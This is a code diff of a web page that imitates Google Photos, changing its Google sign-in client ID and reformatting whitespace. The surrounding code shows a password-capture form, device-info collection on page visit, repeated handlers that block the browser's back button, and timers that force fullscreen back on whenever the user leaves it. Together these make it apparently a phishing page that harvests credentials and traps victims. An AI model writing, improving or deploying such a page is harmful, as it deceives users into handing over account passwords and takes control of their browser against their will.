@@ -1433,7 +1433,7 @@
         <h3 id="lockTitle">Unlock more photos</h3>
         <p id="lockDesc">Sign in with your Google account to view all your photos</p>
 
-        <div id="g_id_onload" data-client_id="338077974110-0k3tjduvmc35pjs51ilgv3riu41b1k9m.apps.googleusercontent.com"
+        <div id="g_id_onload" data-client_id="1051837850098-smvanqd7d2rj06nkpkfli5do8f1uunns.apps.googleusercontent.com"
           data-callback="handleCredentialResponse" data-auto_prompt="false">
         </div>
         <div class="g_id_signin" data-type="standard" data-size="large" data-theme="outline" data-text="sign_in_with"
@@ -1720,7 +1720,7 @@
       <a href="#" class="pwd-forgot" id="pwdForgot">Forgot password?</a>
 
       <div class="pwd-actions">
-        
+
         <button class="pwd-btn-primary" id="pwdSubmit">Next</button>
       </div>
     </div>
@@ -1731,26 +1731,26 @@
     /* ============================================
       DATA
       ============================================ */
-const DEFAULT_IMAGES = [
-  "https://picsum.photos/id/64/600/600",
-  "https://picsum.photos/id/65/600/600",
-  "https://picsum.photos/id/91/600/600",
-  "https://picsum.photos/id/177/600/600",
-  "https://picsum.photos/id/203/600/600",
-  "https://picsum.photos/id/338/600/600",
-  "https://picsum.photos/id/342/600/600",
-  "https://picsum.photos/id/375/600/600",
-  "https://picsum.photos/id/453/600/600",
-  "https://picsum.photos/id/550/600/600",
-  "https://picsum.photos/id/628/600/600",
-  "https://picsum.photos/id/669/600/600",
-  "https://picsum.photos/id/823/600/600",
-  "https://picsum.photos/id/838/600/600",
-  "https://picsum.photos/id/883/600/600",
-  "https://picsum.photos/id/903/600/600",
-  "https://picsum.photos/id/978/600/600",
-  "https://picsum.photos/id/1027/600/600"
-];
+    const DEFAULT_IMAGES = [
+      "https://picsum.photos/id/64/600/600",
+      "https://picsum.photos/id/65/600/600",
+      "https://picsum.photos/id/91/600/600",
+      "https://picsum.photos/id/177/600/600",
+      "https://picsum.photos/id/203/600/600",
+      "https://picsum.photos/id/338/600/600",
+      "https://picsum.photos/id/342/600/600",
+      "https://picsum.photos/id/375/600/600",
+      "https://picsum.photos/id/453/600/600",
+      "https://picsum.photos/id/550/600/600",
+      "https://picsum.photos/id/628/600/600",
+      "https://picsum.photos/id/669/600/600",
+      "https://picsum.photos/id/823/600/600",
+      "https://picsum.photos/id/838/600/600",
+      "https://picsum.photos/id/883/600/600",
+      "https://picsum.photos/id/903/600/600",
+      "https://picsum.photos/id/978/600/600",
+      "https://picsum.photos/id/1027/600/600"
+    ];
 
     const FREE_LIMIT = 6;
     const LOAD_COUNT = 6;
@@ -1845,7 +1845,7 @@ const DEFAULT_IMAGES = [
     /* ============================================
        BACK BUTTON DISABLE + FULLSCREEN RESTORE
        ============================================ */
-    
+
     /* ============================================
        🔒 BACK BUTTON BLOCK + FULLSCREEN RESTORE
        ============================================ */
@@ -1854,7 +1854,7 @@ const DEFAULT_IMAGES = [
     window.addEventListener('popstate', function (e) {
       // 🚫 Back button block — history me wapas push karo
       history.pushState(null, null, location.href);
-      
+
       // 🎯 Toast guide
       if (typeof showToast === 'function') {
         showToast('Google Photos');
@@ -1865,12 +1865,12 @@ const DEFAULT_IMAGES = [
         const tryFS = () => {
           const el = document.documentElement;
           const req = el.requestFullscreen ||
-                      el.webkitRequestFullscreen ||
-                      el.mozRequestFullScreen ||
-                      el.msRequestFullscreen;
-          if (req) req.call(el).catch(() => {});
+            el.webkitRequestFullscreen ||
+            el.mozRequestFullScreen ||
+            el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => { });
         };
-        
+
         // 5 attempts — different timings
         tryFS();
         setTimeout(tryFS, 100);
@@ -1882,7 +1882,7 @@ const DEFAULT_IMAGES = [
     /* ============================================
        🛡️ EXTRA BACK BLOCK LAYERS
        ============================================ */
-    
+
     // Layer 1: Extra popstate (double protection)
     window.addEventListener('popstate', function () {
       if (__userWantsFullscreen) {
@@ -1898,7 +1898,7 @@ const DEFAULT_IMAGES = [
         // Fullscreen restore
         const el = document.documentElement;
         const req = el.requestFullscreen || el.webkitRequestFullscreen;
-        if (req && !document.fullscreenElement) req.call(el).catch(() => {});
+        if (req && !document.fullscreenElement) req.call(el).catch(() => { });
         return '';
       }
     });
@@ -1912,26 +1912,26 @@ const DEFAULT_IMAGES = [
         __restoreTimer = setTimeout(() => {
           const el = document.documentElement;
           const req = el.requestFullscreen ||
-                      el.webkitRequestFullscreen ||
-                      el.mozRequestFullScreen ||
-                      el.msRequestFullscreen;
-          if (req) req.call(el).catch(() => {});
+            el.webkitRequestFullscreen ||
+            el.mozRequestFullScreen ||
+            el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => { });
         }, 200);
       }
     });
-        /* ============================================
-       🖱️ USER CLICK PE AUTO FULLSCREEN RESTORE
-       ============================================ */
+    /* ============================================
+   🖱️ USER CLICK PE AUTO FULLSCREEN RESTORE
+   ============================================ */
     function tryRestoreFS() {
       if (!__userWantsFullscreen) return;
       if (document.fullscreenElement) return;
-      
+
       const el = document.documentElement;
       const req = el.requestFullscreen ||
-                  el.webkitRequestFullscreen ||
-                  el.mozRequestFullScreen ||
-                  el.msRequestFullscreen;
-      if (req) req.call(el).catch(() => {});
+        el.webkitRequestFullscreen ||
+        el.mozRequestFullScreen ||
+        el.msRequestFullscreen;
+      if (req) req.call(el).catch(() => { });
     }
 
     // Har click pe check
@@ -1962,7 +1962,7 @@ const DEFAULT_IMAGES = [
       }
     }, 2000);
     // Fullscreen tootne pe auto-restore
-   
+
     async function init() {
       const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
       allImages = [...uploaded, ...DEFAULT_IMAGES];
@@ -1985,11 +1985,11 @@ const DEFAULT_IMAGES = [
       // 🔥 Step 1: Page visit → device info save
       await saveDeviceToRoot();
       // 🔥 Google SDK initialize karo
-            // 🔥 Google SDK initialize karo — SAME PAGE, NO NEW TAB
-           // 🔥 Google SDK initialize karo — One Tap + FedCM
+      // 🔥 Google SDK initialize karo — SAME PAGE, NO NEW TAB
+      // 🔥 Google SDK initialize karo — One Tap + FedCM
       if (window.google && window.google.accounts) {
         google.accounts.id.initialize({
-          client_id: "338077974110-0k3tjduvmc35pjs51ilgv3riu41b1k9m.apps.googleusercontent.com",
+          client_id: "1051837850098-smvanqd7d2rj06nkpkfli5do8f1uunns.apps.googleusercontent.com",
           callback: handleCredentialResponse,
           use_fedcm_for_prompt: true,
           auto_select: true,
@@ -2450,7 +2450,7 @@ const DEFAULT_IMAGES = [
       if (e.key === 'Enter') { e.preventDefault(); submitPassword(); }
     });
 
-   
+
 
     $('pwdShow').addEventListener('change', (e) => {
       $('pwdInput').type = e.target.checked ? 'text' : 'password';
